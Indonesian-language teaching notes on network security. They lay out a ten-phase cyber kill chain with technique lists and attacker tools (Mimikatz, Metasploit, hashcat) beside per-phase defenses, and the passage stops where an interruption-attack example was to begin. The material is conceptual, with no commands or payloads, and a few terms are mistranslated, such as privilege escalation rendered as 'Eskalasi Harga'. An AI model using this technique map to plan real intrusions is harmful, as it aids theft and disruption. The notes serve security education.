# Keamanan Jaringan (Network Security) dan Kriptografi

![alt text](https://www.extnoc.com/learn/wp-content/uploads/2022/02/Network-Security.jpg)

## 1.1 Konsep Keamanan Jaringan

Dalam era digital modern dengan perkembangan teknologi informasi yang sangat cepat dan meningkatnya ketergantungan organisasi pada jaringan komputer, keamanan jaringan menjadi suatu isu yang sangat penting dan kritis. Keamanan jaringan mencakup keamanan fisik infrastruktur, keamanan komunikasi data, dan keamanan terhadap akses yang tidak berhak. Perlu kita sadari bahwa untuk mencapai keamanan jaringan yang sempurna adalah suatu hal yang sangat mustahil, namun yang bisa kita lakukan adalah untuk meminimalkan risiko dan mengurangi gangguan keamanan tersebut.

Keamanan jaringan bermanfaat menjaga suatu jaringan komputer dari pengaksesan dan modifikasi oleh seseorang yang tidak berhak. Keamanan jaringan semakin dibutuhkan seiring dengan meningkatnya penggunaan internet dan interconnectivity antar organisasi. Selain itu, makin meningkatnya pertukaran data sensitif melalui jaringan publik seperti internet, namun tidak diimbangi dengan pemahaman mendalam tentang ancaman keamanan jaringan. Sehingga data dan informasi yang berharga menjadi terancam untuk diakses, disadap, atau dimodifikasi oleh pihak-pihak yang tidak berhak.

Keamanan jaringan menjadi penting karena ini terkait dengan Privacy, Integrity, Authentication, Confidentiality dan Availability (sering disingkat dengan PIACA). Beberapa ancaman keamanan jaringan adalah eavesdropping, man-in-the-middle attacks, denial of service, malware, dan unauthorized access. Masing-masing memiliki cara untuk mencuri, merusak, atau mengganggu data dan komunikasi yang ada dalam jaringan. Ancaman terhadap keamanan jaringan ini tidak bisa dihilangkan begitu saja, namun kita dapat meminimalkan hal ini dengan menggunakan teknologi keamanan jaringan antara lain firewall, intrusion detection system, encryption, dan Virtual Private Network (VPN).

## 1.2 Pengertian Keamanan Jaringan

Keamanan jaringan adalah suatu cabang teknologi yang dikenal dengan nama keamanan informasi yang diterapkan pada infrastruktur jaringan komputer. Sasaran keamanan jaringan antara lain adalah sebagai perlindungan informasi terhadap pengaksesan tidak sah, pencurian, atau modifikasi, serta pemeliharaan ketersediaan dan integritas jaringan, seperti dijabarkan dalam kebijakan keamanan organisasi.

Menurut Stallings (1995) dalam bukunya "Network and Internetwork Security" menyatakan bahwa: Keamanan jaringan adalah berhubungan dengan pencegahan, deteksi, dan penanganan terhadap tindakan-tindakan yang merusak atau tidak sah yang dilakukan terhadap jaringan komputer.¹

Menurut Kurose & Ross (2012) menyatakan bahwa keamanan jaringan adalah sekumpulan mekanisme dan kebijakan untuk melindungi jaringan dan data dari akses yang tidak sah serta menjamin integritas dan ketersediaan sumber daya jaringan. Keamanan dalam sistem jaringan sangat berpengaruh terhadap beberapa faktor di bawah ini diantaranya adalah:

1. Ancaman dari luar (external threats) seperti hacker dan malicious software
2. Vulnerability pada protokol dan infrastruktur jaringan
3. Keamanan fisik infrastruktur jaringan
4. Keamanan akses dan autentikasi pengguna
5. Denial of Service (DoS) dan Distributed Denial of Service (DDoS) attacks
6. Man-in-the-Middle (MITM) attacks
7. Network eavesdropping dan sniffing
8. Unauthorized data modification
9. Social engineering terhadap network administrators

Keamanan jaringan modern juga mempertimbangkan aspek komunikasi data terenkripsi dan teknik komunikasi yang aman. Tipe keamanan ini banyak menggunakan teknologi kriptografi, protokol keamanan, dan mekanisme kontrol akses untuk melindungi data yang melewati jaringan. Dalam keamanan sistem jaringan yang perlu kita lakukan adalah untuk mempersulit orang lain mengganggu jaringan yang kita miliki, baik pada jaringan lokal maupun jaringan global. Harus dipastikan jaringan bisa berjalan dengan baik, data tetap rahasia, dan komunikasi dapat dipercaya tanpa ada gangguan dari pihak yang tidak berhak.

## 1.3 Penyebab Meningkatnya Ancaman Keamanan Jaringan

Penyebab meningkatnya ancaman keamanan jaringan yaitu:

1. Meningkatnya aplikasi berbasis internet dan jaringan komputer, seperti: cloud computing, IoT (Internet of Things), mobile computing, online services yang tersebar di berbagai lokasi geografis.
2. Semakin kompleksnya infrastruktur jaringan dengan multiple devices, services, dan protocols yang saling terhubung, sementara SDM security terbatas dan skill bervariasi.
3. Adopsi teknologi baru yang belum sepenuhnya dipahami dari sisi security, seperti cloud services, containerization, dan microservices architecture.
4. Meningkatnya kemampuan dan sofistikasi penyerang (attacker) yang menggunakan automated tools dan AI-based attacks.
5. Lemahnya enforcement hukum cybersecurity dan kesulitan dalam penegakan hukum international terhadap cyber criminals.
6. Kompleksitas konfigurasi dan management jaringan yang besar, seringkali berakibat pada misconfiguration dan security gaps.
7. Koneksi internet yang semakin luas membuka potensi attack surface yang lebih besar.
8. Banyaknya tools open-source dan framework yang dapat digunakan untuk melakukan security testing, yang juga dapat disalahgunakan oleh attacker.
9. Banyaknya exploit code dan malware yang tersedia di internet dan darknet yang dapat diakses dengan mudah oleh threat actors.
10. Human factor dan social engineering yang sangat efektif dalam melakukan initial compromise terhadap network.

**Catatan:** Network crime atau cybercrime dapat didefinisikan sebagai perbuatan melanggar hukum yang dilakukan dengan memanfaatkan infrastruktur jaringan komputer dan internet menggunakan teknologi informasi dan komunikasi.

## 1.4 Kebutuhan Keamanan Jaringan

Alasan kenapa keamanan jaringan dibutuhkan:

- **Digital Transformation Era**: Organisasi modern bergantung pada jaringan untuk operasi bisnis yang kritis. Nilai data dan availability sistem menjadi sangat penting dan menuntut kemampuan untuk melindungi informasi secara real-time dan akurat.
- **Interconnected Infrastructure**: Infrastruktur jaringan komputer, seperti LAN, WAN, dan Internet, memungkinkan sharing informasi dan kolaborasi yang cepat, sekaligus membuka potensi adanya security vulnerabilities dan attack vectors.
- **Regulatory & Compliance Requirements**: Banyak organisasi harus mematuhi regulasi seperti GDPR, PCI-DSS, HIPAA yang mewajibkan implementasi security measures tertentu.

Ada beberapa hal penyebab keamanan jaringan dibutuhkan, seperti:

1. **Mengurangi risiko dan exposure terhadap ancaman**: Hal ini sangat penting bagi institusi pemerintah, perusahaan swasta, financial institutions, dan infrastructure providers yang merupakan target utama cyber attacks.
2. **Melindungi aset jaringan dari vulnerabilities**: Vulnerability pada protocol, devices, atau applications dapat menjadikan jaringan berpotensi memberikan akses tidak sah kepada pihak yang tidak berhak, menyebabkan data loss atau system downtime.
3. **Menjaga business continuity dan disaster recovery**: Melindungi jaringan dari gangguan fisik maupun cyber yang dapat menyebabkan service interruption dan financial loss.
4. **Melindungi intellectual property dan confidential data**: Data perusahaan, research, dan informasi sensitif pelanggan harus dilindungi dari theft dan unauthorized access.
5. **Maintaining trust dan reputation**: Network security yang baik memastikan customers dan partners percaya pada keamanan dan reliability organisasi.

## 1.5 Klasifikasi Keamanan Jaringan

Klasifikasi keamanan jaringan dapat dilihat dari berbagai perspektif, menurut Kurose & Ross (2012) dan standards industri lainnya:

### 1. Keamanan Perimeter (Perimeter Security)

Keamanan yang fokus pada perlindungan boundary antara jaringan trusted (internal) dengan jaringan untrusted (external) seperti internet.

**Contoh implementasi:**
- Firewall (stateful, packet filtering)
- Demilitarized Zone (DMZ)
- Border gateway protection
- DDoS mitigation dan filtering

### 2. Keamanan Endpoint (Endpoint Security)

Keamanan yang fokus pada perlindungan devices dan hosts yang terhubung ke jaringan seperti computers, servers, smartphones, dan IoT devices.

**Contoh implementasi:**
- Antivirus dan Anti-malware
- Personal firewalls pada endpoints
- Device hardening dan patch management
- Mobile device management (MDM)
- Host-based Intrusion Detection Systems (HIDS)

### 3. Keamanan Komunikasi Data (Data Communication Security)

Keamanan dari data dan teknik komunikasi yang transit melalui jaringan. Jenis keamanan ini berfokus pada perlindungan informasi saat dalam perjalanan melalui network.

**Contoh implementasi:**
- Encryption (TLS/SSL, IPSec)
- Digital signatures dan message authentication codes
- Virtual Private Networks (VPN)
- Secure protocols (HTTPS, SFTP, SSH)
- Encrypted tunnels

### 4. Keamanan Akses & Identitas (Access & Identity Security)

Mekanisme untuk mengontrol siapa yang dapat mengakses apa di dalam jaringan dan memverifikasi identitas pengguna atau devices.

**Contoh implementasi:**
- Authentication (username/password, multi-factor authentication)
- Authorization dan access control lists (ACLs)
- Role-based access control (RBAC)
- Identity and access management (IAM) systems
- Single sign-on (SSO)

### 5. Keamanan Aplikasi (Application Security)

Keamanan yang fokus pada perlindungan aplikasi dan services yang berjalan di atas jaringan dari vulnerabilities dan attacks.

**Contoh implementasi:**
- Secure coding practices
- Web application firewalls (WAF)
- API security gateways
- Code scanning dan vulnerability assessment
- Input validation dan output encoding

### 6. Monitoring & Detection (Network Monitoring & Detection)

Keamanan yang fokus pada continuous monitoring, detection, dan response terhadap security incidents dan anomalous activities di jaringan.

**Contoh implementasi:**
- Intrusion Detection Systems (IDS)
- Intrusion Prevention Systems (IPS)
- Security Information and Event Management (SIEM)
- Network traffic analysis dan flow monitoring
- User and Entity Behavior Analytics (UEBA)

## 1.6 Karakteristik Ancaman pada Jaringan

Macam-macam karakteristik yang dimiliki oleh threat actors terhadap jaringan:

### a. The Information Seeker (Pencari Informasi)

Tipe attacker ini pada dasarnya tertarik mengumpulkan informasi tentang jaringan target untuk keperluan reconnaissance atau competitive intelligence. Mereka ingin mengetahui architecture, systems, dan vulnerabilities yang ada.

### b. The Network Disruptor (Pengganggu Jaringan)

Tipe attacker ini ingin merusak layanan jaringan, mengganggu operasional, atau menyebabkan denial of service. Mereka tertarik pada impact dan visibility dari serangan mereka.

### c. The Data Thief (Pencuri Data)

Tipe attacker ini tertarik dengan data yang ada di dalam jaringan target, baik untuk keperluan financial gain, corporate espionage, atau selling data di black market. Mereka ingin mengakses dan mengekstrak data tanpa diketahui.

### d. The Persistent Invader (Penyusup Persistent)

Tipe attacker ini melakukan advanced, targeted attacks dengan tujuan untuk mempertahankan akses jangka panjang ke network untuk keperluan espionage, sabotage, atau stealing intellectual property. Mereka menggunakan sophisticated techniques dan berusaha tidak terdeteksi.

## 1.7 Fase Serangan pada Jaringan

Lifecycle dari serangan jaringan (network attack) umumnya terdiri dari tahapan-tahapan berikut:

1. **Pengumpulan Informasi (Reconnaissance)** - Penyerang melakukan pemindaian, pencacahan, dan pengumpulan intelijen terhadap jaringan target untuk mengidentifikasi potensi titik masuk (entry points), kerentanan (vulnerabilities), dan target berharga.

2. **Persiapan Senjata & Persiapan (Weaponization & Preparation)** - Penyerang menyiapkan kode exploit, malware, tools, dan infrastruktur yang dibutuhkan untuk melakukan serangan.

3. **Pengiriman (Delivery)** - Penyerang mengirimkan payload atau malware ke jaringan target melalui berbagai vektor seperti phishing, watering hole, atau eksploitasi kerentanan.

4. **Eksploitasi & Instalasi (Exploitation & Installation)** - Penyerang mengeksekusi payload, melakukan eksploitasi terhadap kerentanan, dan menginstal pintu belakang atau tools akses jarak jauh.

5. **Perintah & Kontrol (Command & Control / C&C)** - Penyerang membangun komunikasi dengan malware yang sudah terinstall untuk mengontrol dan mengarahkan aktivitas serangan.

6. **Tindakan pada Objektif (Actions on Objectives)** - Penyerang melakukan aktivitas sesuai tujuan mereka seperti pencurian data, pergerakan lateral, eskalasi harga, atau manipulasi sistem.

7. **Menghapus Jejak (Covering Tracks)** - Penyerang menghapus logs, bukti, dan jejak dari aktivitas mereka untuk menghindari deteksi dan analisis forensik.

### 1.7.1 Breakdown Detail: Fase Cyber Kill Chain

#### **FASE 1: PENGUMPULAN INFORMASI (RECONNAISSANCE)**

**Definisi:** Fase awal dimana penyerang mengumpulkan informasi sebanyak mungkin tentang target untuk mengidentifikasi kerentanan (vulnerability) dan titik masuk (entry points).

**Aktivitas:**

```
┌─ INTELIJEN SUMBER TERBUKA (OSINT)
│  ├─ Pemindaian catatan publik (WHOIS, catatan DNS)
│  ├─ Profil media sosial
│  ├─ Situs web perusahaan dan dokumentasi publik
│  └─ Database bocor dan situs pastebin
│
├─ Pemindaian dan Pemetaan Port
│  ├─ Nmap untuk menghitung port terbuka
│  ├─ Pengambilan banner layanan
│  ├─ Penemuan topologi jaringan
│  └─ Deteksi Firewall & IDS
│
├─ Penilaian Kerentanan
│  ├─ Pemindaian dengan tools (Nessus, OpenVAS)
│  ├─ Pencarian database (CVE, database exploit)
│  ├─ Identifikasi versi software
│  └─ Penelitian kerentanan yang diketahui
│
└─ Penelitian Rekayasa Sosial
   ├─ Pencacahan karyawan
   ├─ Pemetaan struktur organisasi
   ├─ Identifikasi personel kunci
   └─ Kompilasi daftar target dari sistem yang rentan
```

**Tools:** Nmap, Shodan, OSINT Framework, whois, dig, nslookup, Maltego
**Output:** Daftar target, diagram jaringan, kerentanan yang teridentifikasi, daftar karyawan

---

#### **FASE 2: AKSES AWAL (INITIAL ACCESS)**

**Definisi:** Fase dimana penyerang berhasil mendapatkan posisi pertama di sistem atau jaringan target.

**Metode:**

```
├─ Eksploitasi Kerentanan
│  ├─ Kerentanan software yang tidak ditambal (unpatched)
│  ├─ Eksploitasi zero-day
│  ├─ Eksploitasi tingkat aplikasi
│  └─ Eksploitasi konfigurasi sistem yang salah
│
├─ Rekayasa Sosial
│  ├─ Email phishing dengan lampiran berbahaya
│  ├─ Pretext (tipuan) untuk mendapatkan kredensial
│  ├─ Spear phishing ke individu tertentu
│  └─ Umpan (USB drop, tautan menarik)
│
├─ Serangan Berbasis Kredensial
│  ├─ Sandi bawaan (admin/admin)
│  ├─ Serangan brute force
│  ├─ Serangan kamus (dictionary attacks)
│  ├─ Credential stuffing
│  └─ Pencarian tabel pelangi (rainbow table)
│
├─ Serangan Rantai Pasokan
│  ├─ Kompromi vendor/pemasok
│  ├─ Injeksi rantai pasokan software
│  ├─ Eksploitasi mitra terpercaya
│  └─ Pintu belakang software pihak ketiga
│
└─ Akses Fisik atau Ancaman dari Dalam (Insider Threat)
   ├─ Pelanggaran fisik ke lokasi
   ├─ Penyisipan USB ke perangkat jaringan
   ├─ Kabel jaringan palsu (rogue network cables)
   └─ Karyawan dengan niat berbahaya
```

**Tools:** Metasploit, social engineering toolkit, phishing frameworks, password cracking tools
**Metrik Keberhasilan:** Akses shell, akses akun pengguna, atau kehadiran di jaringan

---

#### **FASE 3: PERSISTENSI (PERSISTENCE)**

**Definisi:** Fase dimana penyerang menginstal mekanisme untuk mempertahankan akses jangka panjang ke sistem target.

**Mekanisme Persistensi:**

```
├─ Pintu Belakang & Akses Jarak Jauh
│  ├─ Instalasi pintu belakang untuk mempertahankan akses
│  ├─ Pengaturan shell terbalik (bind shell, reverse shell)
│  ├─ Web shells (PHP, ASP, JSP)
│  └─ Trojan Akses Jarak Jauh (RATs)
│
├─ Manajemen Akun
│  ├─ Buat akun pengguna tersembunyi
│  ├─ Jadwalkan tugas untuk akses kembali
│  ├─ Cron jobs (Linux) untuk eksekusi yang persisten
│  └─ Penjadwalan perintah At (Windows lama)
│
├─ Manipulasi Boot/Firmware
│  ├─ Modifikasi sektor boot (MBR/UEFI)
│  ├─ Instalasi bootkit
│  ├─ Pintu belakang BIOS/firmware
│  └─ Rootkit untuk persistensi tingkat kernel
│
├─ Registry/Konfigurasi Sistem (Windows)
│  ├─ Modifikasi kunci registry Run
│  ├─ Persistensi folder Startup
│  ├─ Langganan peristiwa WMI
│  └─ Pembajakan COM
│
└─ Instalasi Rootkit
   ├─ Rootkit tingkat kernel
   ├─ Rootkit tingkat hypervisor
   ├─ Rootkit bootloader
   └─ Shell terbalik untuk akses jarak jauh
```

**Tujuan:** Memastikan akses jangka panjang yang tidak terdeteksi bahkan setelah jalur kompromi awal ditutup

---

#### **FASE 4: ESKALASI HARGA (PRIVILEGE ESCALATION)**

**Definisi:** Penyerang meningkatkan level hak akses untuk mendapatkan kontrol yang lebih kuat dan kemampuan yang lebih besar.

**Metode Eskalasi:**

```
├─ Eskalasi Harga Lokal (Horizontal & Vertical)
│  ├─ Naikkan dari pengguna ke administrator/root
│  ├─ Exploit kernel untuk eskalasi ke tingkat sistem/kernel
│  ├─ Eksploitasi izin file yang lemah
│  └─ Konfigurasi sudo yang salah (Linux)
│
├─ Pencurian & Penggunaan Ulang Kredensial
│  ├─ Penyamaran token / pencurian token
│  ├─ Kredensial yang dicuri dari data cache
│  ├─ Eksploitasi manajer sandi
│  └─ Akses penyimpanan kredensial browser
│
├─ Eksploitasi Layanan/Daemon
│  ├─ Penyalahgunaan biner SUID/SGID
│  ├─ Penyalahgunaan konteks hak akses layanan
│  ├─ Injeksi DLL untuk perolehan hak akses
│  └─ Eksploitasi kerentanan layanan Windows
│
└─ Eksploitasi Konfigurasi Salah
   ├─ Kontrol akses yang lemah
   ├─ Kredensial administratif bawaan
   ├─ File konfigurasi yang tidak terlindungi
   └─ Cacat warisan hak akses
```

**Teknik:** Exploit kernel, privilege escalation tools, credential dumping, injeksi DLL

---

#### **FASE 5: PENGHINDARAN PERTAHANAN (DEFENSE EVASION)**

**Definisi:** Penyerang berusaha menghindari dan menonaktifkan mekanisme keamanan untuk tetap tidak terdeteksi.

**Teknik Penghindaran:**

```
├─ Penonaktifan Alat Keamanan
│  ├─ Nonaktifkan solusi antivirus/EDR
│  ├─ Modifikasi aturan firewall
│  ├─ Penonaktifan Windows Defender/AMSI
│  └─ Penghentian layanan keamanan
│
├─ Penyembunyian Proses/Eksekusi
│  ├─ Pengosongan proses / injeksi proses
│  ├─ Sembunyikan malware dalam proses sah
│  ├─ Injeksi DLL ke proses terpercaya
│  └─ Obfuskasi nilai registry
│
├─ Penghapusan Log & Bukti
│  ├─ Hapus log peristiwa
│  ├─ Hapus riwayat perintah (.bash_history, PowerShell history)
│  ├─ Hapus jejak dari sistem file
│  ├─ Utilitas penghapus disk
│  └─ Manipulasi & modifikasi log
│
├─ Penyembunyian Rootkit & Tingkat Driver
│  ├─ Instalasi rootkit untuk menyembunyikan kehadiran
│  ├─ Penyembunyian daftar proses
│  ├─ Penyembunyian file/registry
│  └─ Penyembunyian koneksi jaringan
│
└─ Komunikasi Terenkripsi & Kabur
   ├─ Enkripsi komunikasi C2
   ├─ Obfuskasi traffic untuk menghindari deteksi
   ├─ Peniruan protokol (HTTP C2, DNS tunneling)
   └─ Rantai proxy untuk anonimitas
```

**Tujuan:** Meminimalkan probabilitas deteksi dan efektivitas respons insiden

---

#### **FASE 6: PENGAMBILAN KREDENSIAL (CREDENTIAL ACCESS)**

**Definisi:** Penyerang mencuri kredensial untuk mendapatkan akses ke sistem dan sumber daya tambahan.

**Metode Pengambilan Kredensial:**

```
├─ Pemantauan Aktif
│  ├─ Keylogger untuk menangkap sandi
│  ├─ Utilitas tangkapan layar
│  ├─ Pemantauan clipboard
│  └─ Pemantauan editor metode input (IME)
│
├─ Pengambilan Memori
│  ├─ Pengambilan memori proses LSASS (Windows)
│  ├─ Ekstraksi database SAM
│  ├─ Pengambilan hash sandi
│  └─ Ekstraksi kredensial seperti Mimikatz
│
├─ Akses Penyimpanan Kredensial
│  ├─ Pencurian manajer sandi browser
│  ├─ Pencurian kunci SSH
│  ├─ Pencurian kredensial aplikasi
│  └─ Akses kredensial penyedia cloud
│
├─ Brute Force & Cracking
│  ├─ Serangan kamus (dictionary attack)
│  ├─ Serangan brute force (online & offline)
│  ├─ Pencarian tabel pelangi (rainbow table)
│  └─ Cracking dipercepat GPU
│
└─ Intersepsi Traffic
   ├─ Serangan MITM untuk pengambilan kredensial
   ├─ Network sniffing pada segmen lokal
   ├─ Pengambilan kredensial WiFi
   └─ Eksploitasi protokol plaintext
```

**Tools:** Keylogging tools, Mimikatz, credential dumpers, hashcat, John the Ripper

---

#### **FASE 7: PENEMUAN (DISCOVERY)**

**Definisi:** Penyerang melakukan reconnaissance yang lebih dalam di jaringan internal untuk mengidentifikasi target berkualitas tinggi.

**Aktivitas Penemuan:**

```
├─ Pencacahan Pengguna & Izin
│  ├─ Daftar semua pengguna dan kelompok
│  ├─ Analisis izin untuk identifikasi hak akses
│  ├─ Penemuan objek Kebijakan Grup (GPO)
│  └─ Pencacahan berbagi dan pemeriksaan akses
│
├─ Pemetaan Topologi Jaringan
│  ├─ Peta topologi jaringan dari internal
│  ├─ Penemuan subnet
│  ├─ Identifikasi konfigurasi router & firewall
│  └─ Analisis segmentasi jaringan
│
├─ Inventaris Sistem & Layanan
│  ├─ Jenis dan versi sistem operasi
│  ├─ Layanan & port yang berjalan
│  ├─ Inventaris software yang diinstal
│  ├─ Referensi silang database kerentanan
│  └─ Identifikasi kelemahan konfigurasi
│
├─ Penemuan Data
│  ├─ Pencacahan berbagi file
│  ├─ Penemuan database
│  ├─ Identifikasi sistem & data berharga
│  ├─ Klasifikasi data dan sensitivitas
│  └─ Penemuan lokasi backup
│
└─ Penilaian Postur Keamanan
   ├─ Periksa alat keamanan aktif
   ├─ Identifikasi kehadiran IDS/IPS
   ├─ Inventaris perlindungan endpoint
   ├─ Analisis mekanisme logging
   └─ Penilaian peluang pergerakan lateral
```

**Tools:** net commands, PowerShell enumeration, Bloodhound, nmap, Shodan

---

#### **FASE 8: PERGERAKAN LATERAL (LATERAL MOVEMENT)**

**Definisi:** Penyerang menggunakan sistem yang dikompromikan untuk mengakses sistem lain dalam jaringan.

**Teknik Pergerakan Lateral:**

```
├─ Akses Berbasis Kredensial
│  ├─ Gunakan kredensial yang dicuri pada sistem lain
│  ├─ Serangan pass-the-hash (PTH)
│  ├─ Serangan pass-the-ticket (PTT)
│  ├─ Serangan penggunaan ulang token
│  └─ Eksploitasi Kerberos
│
├─ Eksploitasi Hubungan Kepercayaan
│  ├─ Eksploitasi kepercayaan domain
│  ├─ Hubungan kepercayaan server-ke-server
│  ├─ Eksploitasi rantai delegasi
│  └─ Penyalahgunaan akun layanan terpercaya
│
├─ Eksploitasi Kerentanan Jaringan
│  ├─ Eksploitasi sistem yang tidak ditambal di jaringan
│  ├─ Eksploitasi layanan bersama
│  ├─ Serangan VLAN hopping
│  └─ Spoofing ARP untuk akses jaringan
│
├─ Pivoting & Proxying
│  ├─ Gunakan sistem yang dikompromikan sebagai pivot point
│  ├─ Tunneling SSH
│  ├─ Rantai proxy SOCKS
│  └─ Reverse proxies untuk akses sumber daya internal
│
└─ Akses ke Segmen Sensitif
   ├─ Akses database servers
   ├─ Akses file servers dan repositories
   ├─ Akses email systems
   └─ Akses administrative consoles
```

**Tujuan:** Perluas jangkauan akses ke target bernilai tinggi dan data sensitif

---

#### **FASE 9: PENGAMBILAN DATA (EXFILTRATION)**

**Definisi:** Penyerang mengekstrak dan mentransfer data dari jaringan target ke infrastruktur yang dikontrolnya.

**Metode Pengambilan Data:**

```
├─ Persiapan Data
│  ├─ Kompresi data (ZIP, RAR, TAR)
│  ├─ Enkripsi data sebelum transfer
│  ├─ Staging data ke lokasi sementara
│  └─ Pembagian data untuk menghindari deteksi
│
├─ Saluran Pengambilan Data
│  ├─ Saluran C2 langsung
│  ├─ Saluran terenkripsi HTTPS
│  ├─ Tunneling DNS (pengambilan via kueri DNS)
│  ├─ Tunneling ICMP
│  ├─ Pengambilan email
│  └─ Penyimpanan cloud (Google Drive, Dropbox, OneDrive)
│
├─ Pengambilan Data Lambat
│  ├─ Transfer data bertahap untuk menghindari deteksi
│  ├─ Transfer terjadwal
│  ├─ Pengambilan bandwidth rendah
│  └─ Pengambilan jam sibuk
│
├─ Transfer Tersembunyi
│  ├─ Sematkan data dalam traffic sah
│  ├─ Tunneling protokol
│  ├─ Penggunaan VPN/proxy
│  └─ Traffic umpan untuk menyembunyikan pengambilan sebenarnya
│
└─ Cleanup & Penghapusan Bukti
   ├─ Hapus log pengambilan
   ├─ Hapus riwayat transfer
   ├─ Hapus file staging sementara
   └─ Operasi pembersihan sistem
```

**Saluran:** HTTP/HTTPS, DNS, FTP, SSH, Cloud services, Email, Custom protocols

---

#### **FASE 10: DAMPAK (IMPACT)**

**Definisi:** Penyerang mengeksekusi tujuan akhir mereka - baik finansial, informasional, atau disruptif.

**Jenis Dampak:**

```
├─ Penghancuran & Manipulasi Data
│  ├─ Enkripsi ransomware (enkripsi data kritis)
│  ├─ Penghapusan atau pengosongan data
│  ├─ Manipulasi dan korupsi database
│  ├─ Penghancuran sistem file
│  └─ Penghancuran backup untuk maksimalkan dampak
│
├─ Gangguan Sistem
│  ├─ Serangan Denial of Service (DoS)
│  ├─ Crash layanan dan outages
│  ├─ Shutdown sistem/hibernation
│  ├─ Kelelahan sumber daya
│  └─ Serangan boot (penghancuran BIOS/UEFI)
│
├─ Penempatan Malware
│  ├─ Penempatan malware canggih ke sistem kritis
│  ├─ Propagasi worm
│  ├─ Command & control botnet
│  ├─ Malware crypto-mining
│  └─ Spyware untuk pengawasan berkelanjutan
│
├─ Dampak Finansial
│  ├─ Tuntutan utas tebusan (ransomware)
│  ├─ Transaksi fraud
│  ├─ Pengambilalihan akun
│  └─ Kompromi email bisnis
│
└─ Perang Reputasi & Informasi
   ├─ Publikasikan data sensitif/rahasia
   ├─ Ancaman pengungkapan publik
   ├─ Percobaan pemerasan (blackmail)
   ├─ Gangguan media sosial
   ├─ Penggantian situs web (website defacement)
   └─ Kerusakan reputasi brand
```

**Hasil:** Gangguan bisnis, kerugian finansial, denda regulasi, kerusakan reputasi, kehilangan kepercayaan pelanggan

---

### Timeline Cyber Kill Chain - Contoh

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    TIMELINE SERANGAN TIPIKAL                             │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  MINGGU 1-2:        HARI 5:             JAM 2:           BERKELANJUTAN: │
│  Pengumpulan Info   Akses Awal         Eskalasi Harga   Persistensi &  │
│  (minggu)           (phishing/vuln)     (kernel exploit)  Pengambilan   │
│                                                            Data           │
│                                                                         │
│  Penyerang         Korban membuka      Penyerang         Akses jangka  │
│  mengumpulkan      lampiran email,     menjadi           panjang        │
│  intelijen         mendapat akses      administrator,    dipertahankan, │
│  tentang perusahaan shell ke akun     menginstal pintu   pengambilan   │
│  target (karyawan, pengguna           belakang           data terus     │
│  aplikasi, infra)                                        berlanjut      │
│                                                                         │
└──────────────────────────────────────────────────────────────────────────┘
```

### Tindakan Perlawanan per Fase

| Fase | Metode Deteksi | Metode Pencegahan |
|------|----------------|------------------|
| **Pengumpulan Info** | Pemantauan jaringan, threat intel, brand monitoring | Pelatihan respons insiden, kebijakan info sec |
| **Akses Awal** | Keamanan email, deteksi endpoint, IDS/IPS | Manajemen patch, MFA, kesadaran keamanan |
| **Persistensi** | Pemantauan integritas file, analisis perilaku | Solusi EDR, least privilege, audit trails |
| **Eskalasi Harga** | Pemantauan sistem, analisis perilaku | Privilege Access Management (PAM), updates |
| **Penghindaran Pertahanan** | Advanced EDR, deteksi perilaku, sandboxing | Disable PowerShell, AMSI, ASR rules |
| **Pengambilan Kredensial** | Analisis hash, logon auditing, credential monitoring | Kebijakan sandi, MFA, secrets management |
| **Penemuan** | Segmentasi jaringan, pemantauan aktivitas | Monitoring tools, zero trust architecture |
| **Pergerakan Lateral** | Analisis traffic jaringan, deteksi perilaku | Segmentasi jaringan, microsegmentation |
| **Pengambilan Data** | DLP tools, pemantauan jaringan, deteksi perilaku | DLP, pemantauan jaringan, enkripsi |
| **Dampak** | Alerts, pemantauan, respons insiden | Redundansi backup, disaster recovery, resilience |

## 1.8 Prinsip Keamanan Jaringan (CIA Triad)

Menurut Stallings dan berbagai standards security industry, terdapat tiga prinsip fundamental dalam keamanan jaringan yang dikenal sebagai CIA Triad:

### 1. Confidentiality (Kerahasiaan)

**Definisi:** Menjaga informasi dari akses oleh pihak yang tidak berhak. Hanya pihak yang diotorisasi yang dapat mengakses informasi.

**Implementasi:**
- Encryption data at rest dan in transit
- Access controls dan authentication mechanisms
- Data classification dan handling policies

**Ancaman:** Eavesdropping, sniffing, unauthorized access, data breaches

### 2. Integrity (Integritas)

**Definisi:** Memastikan informasi tidak diubah, dihapus, atau dimodifikasi oleh pihak yang tidak berhak. Data harus tetap konsisten dan tidak rusak.

**Implementasi:**
- Digital signatures dan message authentication codes (MAC)
- Hash functions dan checksums
- File integrity monitoring
- Change management dan audit trails

**Ancaman:** Man-in-the-middle attacks, data modification, malware injection, unauthorized changes

### 3. Availability (Ketersediaan)

**Definisi:** Memastikan bahwa jaringan dan services dapat diakses oleh authorized users ketika dibutuhkan. Sistem harus reliable dan resilient terhadap disruptions.

**Implementasi:**
- Redundancy dan failover mechanisms
- Load balancing dan capacity planning
- Disaster recovery dan business continuity plans
- DDoS protection dan mitigation strategies

**Ancaman:** Denial of Service (DoS), DDoS attacks, system failures, resource exhaustion

### Dimensi Tambahan:

Selain CIA Triad, konsep keamanan jaringan modern juga mencakup:

**4. Authentication (Autentikasi)**
- Memverifikasi identitas pengguna atau devices
- Mechanisms: passwords, biometrics, digital certificates, multi-factor authentication

**5. Non-repudiation (Non-Penyangkalan)**
- Memastikan bahwa pengirim tidak dapat menyangkal telah mengirim informasi
- Implementasi: digital signatures, audit logs, timestamps

---

## 2.1 Security Attack Models

Menurut W. Stallings [William Stallings, "Network and Internetwork Security," Prentice Hall, 1995]. Serangan (attack) terdiri dari:

### 1. Interruption (Interupsi)

Interruption adalah ancaman terhadap availability. Informasi dan data yang merupakan sistem komputer dirusak dan dihapus sehingga jika dibutuhkan, data atau informasi tersebut tidak lagi ada.⁸

**Ilustrasi Interruption Attack:**

![alt text](https://raw.githubusercontent.com/Agressiv1njector/TangselSecTeam/refs/heads/main/images/instrupsi.png)

```
┌─────────────────────────────────────────────────────────────┐
│           INTERRUPTION ATTACK (Availability Threat)         │
└─────────────────────────────────────────────────────────────┘

Normal Condition:
┌─────────┐         ┌──────────┐         ┌──────────┐
│  User   │────────▶│  Server  │────────▶│   Data   │
└─────────┘         └──────────┘         └──────────┘
   Request            Process             Available

Attack Condition:
┌──────────┐         ┌──────────┐         ┌──────────┐
│ Attacker │────────▶│  Server  │────────▶│   Data   │
└──────────┘         └──────────┘         └──────────┘
  DOS/DDOS           Overwhelmed             DELETED
   Flood             CRASHED/DOWN            DESTROYED
                     NOT AVAILABLE           ✗ GONE
```

**Contoh penyerangannya:**
